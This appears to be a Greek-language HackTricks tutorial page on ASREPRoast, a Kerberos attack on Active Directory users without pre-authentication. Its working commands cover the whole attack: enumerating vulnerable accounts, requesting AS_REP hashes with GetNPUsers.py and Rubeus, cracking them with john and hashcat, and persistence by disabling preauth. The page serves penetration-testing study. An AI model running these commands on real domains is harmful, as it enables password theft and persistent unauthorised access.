# ASREPRoast

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετάσχετε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Χάκινγκ**\
Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενημερωμένοι με τις νεότερες ευρήματα ασφαλείας που ξεκινούν και τις κρίσιμες ενημερώσεις των πλατφορμών

**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!**

## ASREPRoast

Το ASREPRoast είναι μια επίθεση ασφαλείας που εκμεταλλεύεται χρήστες που δεν έχουν το χαρακτηριστικό **απαιτούμενη προ-πιστοποίηση Kerberos**. Ουσιαστικά, αυτή η ευπάθεια επιτρέπει στους επιτιθέμενους να ζητήσουν πιστοποίηση για έναν χρήστη από τον ελεγκτή του τομέα (DC) χωρίς να χρειάζονται τον κωδικό πρόσβασης του χρήστη. Ο DC απαντά στη συνέχεια με ένα μήνυμα που έχει κρυπτογραφηθεί με τον κλειδί που προέρχεται από τον κωδικό πρόσβασης του χρήστη, το οποίο οι επιτιθέμενοι μπορούν να προσπαθήσουν να αποκρυπτογραφήσουν εκτός σύνδεσης για να ανακαλύψουν τον κωδικό πρόσβασης του χρήστη.

Οι κύριες απαιτήσεις για αυτήν την επίθεση είναι:
- **Έλλειψη προ-πιστοποίησης Kerberos**: Οι στόχοι χρήστες δεν πρέπει να έχουν ενεργοποιημένο αυτό το χαρακτηριστικό ασφαλείας.
- **Σύνδεση με τον ελεγκτή του τομέα (DC)**: Οι επιτιθέμενοι χρειάζονται πρόσβαση στον DC για να στείλουν αιτήματα και να λάβουν κρυπτογραφημένα μηνύματα.
- **Προαιρετικός λογαριασμός τομέα**: Έχοντας ένα λογαριασμό τομέα επιτρέπει στους επιτιθέμενους να αναγνωρίσουν πιο αποτελεσματικά ευπαθείς χρήστες μέσω ερωτημάτων LDAP. Χωρίς έναν τέτοιο λογαριασμό, οι επιτιθέμενοι πρέπει να μαντέψουν τα ονόματα χρηστών.


#### Απαρίθμηση ευπαθών χρηστών (χρειάζεται διαπιστευτήρια τομέα)

{% code title="Χρησιμοποιώντας τα Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% code title="Χρησιμοποιώντας Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
{% endcode %}

#### Αίτηση μηνύματος AS_REP

{% code title="Χρησιμοποιώντας Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% code title="Χρήση των Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
Η επίθεση AS-REP Roasting με το Rubeus θα δημιουργήσει ένα 4768 με έναν τύπο κρυπτογράφησης 0x17 και έναν τύπο προεπιλογής 0.
{% endhint %}

### Αποκρυπτογράφηση
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Μόνιμη παραμονή

Εξαναγκάστε την απαίτηση **preauth** να μην είναι απαραίτητη για έναν χρήστη όπου έχετε δικαιώματα **GenericAll** (ή δικαιώματα για εγγραφή ιδιοτήτων):

{% code title="Χρήση στα Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% code title="Χρησιμοποιώντας Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## Αναφορές

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Hacking**\
Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενημερωμένοι με τις νεότερες ευρήματα ασφαλείας που κυκλοφορούν και τις κρίσιμες ενημερώσεις των πλατφορμών

**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!**

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετέχετε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή την [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) **και** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **αποθετήρια του github.**

</details>
